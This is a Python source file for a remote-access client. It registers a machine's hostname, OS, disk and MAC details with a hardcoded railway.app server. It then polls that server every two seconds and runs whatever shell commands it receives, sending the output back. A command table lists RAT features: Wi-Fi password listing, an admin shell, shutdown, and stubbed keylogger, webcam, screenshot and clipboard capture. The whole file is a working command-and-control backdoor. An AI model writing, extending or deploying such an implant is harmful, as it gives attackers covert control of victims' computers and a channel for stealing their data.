#!/usr/bin/env python3
"""
Web-based client for Railway deployment
This client connects via HTTP instead of raw TCP sockets
"""

import requests
import json
import platform
import threading
import subprocess
import time
import psutil
import uuid
import os
import re
import base64
from urllib.parse import urljoin

# Configuration
SERVER_URL = os.environ.get('SERVER_URL', 'https://pablo1-production.up.railway.app')
RECONNECT_DELAY = 10     # Seconds between reconnection attempts
HEARTBEAT_INTERVAL = 30  # Seconds between heartbeats

class WebClient:
    def __init__(self):
        self.client_id = f"{platform.node()}-{uuid.getnode()}"
        self.session_id = str(uuid.uuid4())
        self.running = True
        self.session = requests.Session()
        self.system_info = self.get_system_info()
        print(f"Web Client initialized with ID: {self.client_id}")
        print(f"Target Server: {SERVER_URL}")

    def get_system_info(self):
        """Collect detailed system information"""
        try:
            disks = []
            for part in psutil.disk_partitions(all=False):
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    disks.append({
                        "device": part.device,
                        "mountpoint": part.mountpoint,
                        "total_gb": round(usage.total / (1024**3)),
                        "used_gb": round(usage.used / (1024**3)),
                        "free_gb": round(usage.free / (1024**3))
                    })
                except:
                    continue
            
            return {
                "basic": {
                    "hostname": platform.node(),
                    "os": platform.system(),
                    "os_version": platform.version(),
                    "architecture": platform.machine(),
                    "processor": platform.processor(),
                    "python_version": platform.python_version()
                },
                "resources": {
                    "cpu_cores": psutil.cpu_count(),
                    "total_ram": round(psutil.virtual_memory().total / (1024**3)),
                    "disks": disks
                },
                "network": {
                    "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,8*6,8)][::-1]),
                    "ip_address": "Web Client"  # Can't determine real IP from client side
                },
                "session": {
                    "client_id": self.client_id,
                    "session_id": self.session_id,
                    "connection_type": "HTTP",
                    "process_id": os.getpid()
                }
            }
        except Exception as e:
            print(f"Error collecting system info: {e}")
            return {"error": str(e)}

    def execute_command(self, command):
        """Execute system command with special command handling"""
        try:
            print(f"Executing command: {command}")
            
            # Handle special commands with mappings
            command_mappings = {
                "shutdown": "shutdown /s /t 0",
                "open_cmd": "start cmd",
                "open_cmd_admin": "start runas /user:Administrator cmd.exe",
                "open_calculator": "calc.exe",
                "open_notepad": "notepad.exe",
                "get_owner": "net user %USERNAME%",
                "tasklist": "tasklist",
                "get_wifi_passwords": "netsh wlan show profiles",
                "capture_webcam": "echo Webcam capture not implemented in web client",
                "capture_screenshot": "echo Screenshot capture not implemented in web client",
                "keylog_start": "echo Keylogger not implemented in web client",
                "keylog_stop": "echo Keylogger not implemented in web client",
                "clipboard_start": "echo Clipboard monitoring not implemented in web client",
                "clipboard_stop": "echo Clipboard monitoring not implemented in web client",
                "clipboard_get": "echo Clipboard access not implemented in web client"
            }
            
            # Use mapped command if available, otherwise use original
            actual_command = command_mappings.get(command, command)
            
            result = subprocess.run(
                actual_command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30,
                encoding='utf-8',
                errors='replace'
            )
            
            if result.returncode == 0:
                output = result.stdout.strip() or "Command executed successfully"
                print(f"Command success: {len(output)} characters")
                return output
            else:
                error = f"ERROR ({result.returncode}): {result.stderr.strip()}"
                print(f"Command error: {error}")
                return error
                
        except subprocess.TimeoutExpired:
            print("Command timed out")
            return "ERROR: Command timed out after 30 seconds"
        except Exception as e:
            print(f"Command execution error: {e}")
            return f"ERROR: {str(e)}"

    def register_client(self):
        """Register this client with the server"""
        try:
            url = urljoin(SERVER_URL, '/api/register_client')
            data = {
                'client_id': self.client_id,
                'system_info': self.system_info,
                'connection_type': 'web'
            }
            
            response = self.session.post(url, json=data, timeout=10)
            if response.status_code == 200:
                print("Successfully registered with server")
                return True
            else:
                print(f"Failed to register: {response.status_code}")
                return False
        except Exception as e:
            print(f"Registration error: {e}")
            return False

    def poll_commands(self):
        """Poll for commands from the server"""
        try:
            url = urljoin(SERVER_URL, f'/api/get_commands/{self.client_id}')
            response = self.session.get(url, timeout=5)
            
            if response.status_code == 200:
                data = response.json()
                commands = data.get('commands', [])
                
                for command_data in commands:
                    command = command_data.get('command')
                    command_id = command_data.get('command_id')
                    
                    if command:
                        print(f"Received command: {command}")
                        result = self.execute_command(command)
                        self.send_result(command_id, command, result)
                        
            elif response.status_code == 404:
                # Client not found, try to re-register
                print("Client not found on server, re-registering...")
                self.register_client()
                
        except Exception as e:
            print(f"Polling error: {e}")

    def send_result(self, command_id, command, result):
        """Send command result back to server"""
        try:
            url = urljoin(SERVER_URL, '/api/command_result')
            data = {
                'client_id': self.client_id,
                'command_id': command_id,
                'command': command,
                'result': result
            }
            
            response = self.session.post(url, json=data, timeout=10)
            if response.status_code == 200:
                print(f"Successfully sent result for command: {command}")
            else:
                print(f"Failed to send result: {response.status_code}")
                
        except Exception as e:
            print(f"Error sending result: {e}")

    def send_heartbeat(self):
        """Send periodic heartbeat to server"""
        while self.running:
            try:
                url = urljoin(SERVER_URL, '/api/heartbeat')
                data = {
                    'client_id': self.client_id,
                    'status': 'active',
                    'timestamp': time.time()
                }
                
                response = self.session.post(url, json=data, timeout=5)
                if response.status_code == 200:
                    print("Heartbeat sent")
                else:
                    print(f"Heartbeat failed: {response.status_code}")
                    
            except Exception as e:
                print(f"Heartbeat error: {e}")
                
            time.sleep(HEARTBEAT_INTERVAL)

    def start(self):
        """Start the web client"""
        print("Starting web client...")
        print(f"Connecting to: {SERVER_URL}")
        
        # Start heartbeat thread
        heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        heartbeat_thread.start()
        
        while self.running:
            try:
                # Try to register/connect
                if self.register_client():
                    print("Connected to server successfully!")
                    
                    # Main polling loop
                    while self.running:
                        self.poll_commands()
                        time.sleep(2)  # Poll every 2 seconds
                        
                else:
                    print(f"Failed to connect, retrying in {RECONNECT_DELAY} seconds...")
                    time.sleep(RECONNECT_DELAY)
                    
            except KeyboardInterrupt:
                print("Shutting down client...")
                self.running = False
            except Exception as e:
                print(f"Connection error: {e}")
                print(f"Retrying in {RECONNECT_DELAY} seconds...")
                time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    # For Railway deployment, set the server URL
    if 'railway.app' in SERVER_URL or 'render.com' in SERVER_URL:
        print("Web client mode - using HTTP API instead of TCP")
    
    client = WebClient()
    try:
        client.start()
    except KeyboardInterrupt:
        print("Client stopped by user")
    except Exception as e:
        print(f"Client error: {e}")